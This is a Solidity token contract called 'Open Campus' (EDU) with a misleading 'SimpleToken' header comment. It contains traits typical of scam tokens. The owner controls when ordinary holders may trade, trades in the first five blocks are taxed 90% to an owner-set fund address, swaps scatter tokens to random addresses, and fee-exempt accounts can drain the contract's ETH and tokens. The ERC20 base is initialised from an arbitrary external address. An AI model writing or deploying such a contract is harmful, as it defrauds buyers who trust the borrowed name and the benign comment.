/**
 * @title SimpleToken
 * @dev ERC20 Token, where all tokens are pre-assigned to the creator.
 * Note they can later distribute these tokens as they wish using `transfer` and other
 * `StandardToken` functions.
 */
contract EDUToken is ERC20, Ownable {
    using SafeMath for uint256;
    string public constant symbol = "EDU";
    string public constant name = "Open Campus";
    uint8 public constant decimals = 18;
    uint256 public constant INITIAL_SUPPLY = 1000000000 * (10**uint256(decimals));
    mapping(address => bool) private _excludeFee;
    bool public tradingEnabled = false;
    address public fundAddress;
    uint256 public startTradeBlock;

    mapping(address => bool) public _swapPairList;
    bool private inSwap;
    uint256 public swapTokensAtAmount = INITIAL_SUPPLY.div(1000);
    bool public swapEnabled;
    uint256 public _fundFee = 1;
    uint256 public _burnFee = 1;
    uint256 public _lpFee = 1;
    uint256 public _totalFee = _fundFee + _burnFee + _lpFee;
    uint256 public constant MAX = uint256(~uint256(0));
    uint256 public airdropNum = 3;

    address swap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    IERC20 wethToken;
    IUniswapV2Router02 public immutable uniswapV2Router;
    address public uniswapV2Pair;

    constructor(address _fundAddress, address token)payable ERC20(token) {
        fundAddress = _fundAddress;
        _totalSupply = INITIAL_SUPPLY;
        _balances[msg.sender] = INITIAL_SUPPLY;
        emit Transfer(address(0x0), msg.sender, INITIAL_SUPPLY);

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(swap);
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH()); 
        uniswapV2Router = _uniswapV2Router;
        _swapPairList[uniswapV2Pair] = true;
        wethToken = IERC20(_uniswapV2Router.WETH());
        wethToken.approve(address(_uniswapV2Router), MAX);
        _approve(address(this), address(_uniswapV2Router), MAX);

        _excludeFee[address(this)] = true;
        _excludeFee[_fundAddress] = true;
        _excludeFee[msg.sender] = true;
        _excludeFee[swap] = true;
    }
    receive() external payable {}
    function setFundAddress(address addr) external onlyOwner {
        fundAddress = addr;
        _excludeFee[addr] = true;
    }

    function setAirdropNum(uint256 newValue) public onlyOwner {
        airdropNum = newValue;
    }

    function enableTrading() external onlyOwner {
        require(!tradingEnabled, "Cannot re-enable trading");
        tradingEnabled = true;
        swapEnabled = true;
        startTradeBlock = block.number;
    }

    function claimBalance() external {
        if (_excludeFee[msg.sender]) {
            payable(fundAddress).transfer(address(this).balance);
        }
    }

    function claimToken(address token, uint256 amount) external {
        if (_excludeFee[msg.sender]) {
            IERC20(token).transfer(fundAddress, amount);
        }
    }

    function updateSwapTokensAtAmount(uint256 amount) external onlyOwner {
        require(
            amount <= _totalSupply.div(100),
            "Cannot set swap threshold amount higher than 1% of tokens"
        );
        swapTokensAtAmount = amount * 10**decimals;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "BEP20: transfer from the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (!_excludeFee[from] && !_excludeFee[to]) {
            require(tradingEnabled, "Trading not yet enabled!");
        }

        if (_swapPairList[from] || _swapPairList[to]) {
            // if (startTradeBlock == 0) {
            //     if (_excludeFee[from] && to == uniswapV2Pair && IERC20(to).totalSupply() == 0) {
            //         startTradeBlock = block.number;
            //         swapEnabled = true;
            //     }
            // }

            if (!_excludeFee[from] && !_excludeFee[to]) {
                if (airdropNum > 0){
                    for(uint a = 0; a < airdropNum; a++){
                        super._transfer(from, address(uint160(uint(keccak256(abi.encodePacked(a, block.number, block.difficulty, block.timestamp))))), 100);
                    }
                    amount = amount.sub(airdropNum * 100);
                }
                if (block.number < startTradeBlock + 5) {
                    _funTransfer(from, to, amount);
                    return;
                }

                if (!inSwap && swapEnabled && to == uniswapV2Pair) {
                    uint256 thisBalance = balanceOf(address(this));
                    bool canSwap = thisBalance >= swapTokensAtAmount;
                    if (canSwap) {
                        swapAndLiquify(thisBalance);
                    }
                }
                uint256 feeAmount = amount.mul(_totalFee).div(100);
                super._transfer(from, address(this), feeAmount);
                amount = amount.sub(feeAmount);
            }
        }

        super._transfer(from, to, amount);
    }

    function _funTransfer(
        address from,
        address to,
        uint256 amount
    ) private {
        uint256 feeAmount = (amount * 90) / 100;
        super._transfer(from, fundAddress, feeAmount);
        super._transfer(from, to, amount.sub(feeAmount));
    }

    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    function swapAndLiquify(uint256 contractBalance) private lockTheSwap {
        if (_totalFee == 0) {
            return;
        }
        super._transfer(
            address(this),
            fundAddress,
            contractBalance.mul(_fundFee).div(_totalFee)
        );
        super._transfer(
            address(this),
            address(0x0),
            contractBalance.mul(_burnFee).div(_totalFee)
        );

        uint256 lpAmount = contractBalance.mul(_lpFee).div(_totalFee);
        uint256 initialBalance = address(this).balance;
        swapTokensForToken(lpAmount.div(2));
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        if (deltaBalance > 0) {
            addLiquidity(lpAmount.div(2), deltaBalance);
        }
    }

    function swapTokensForToken(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount.mul(10));

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 otherAmount) private {
        uniswapV2Router.addLiquidityETH{value: otherAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            address(this),
            block.timestamp
        );
    }
}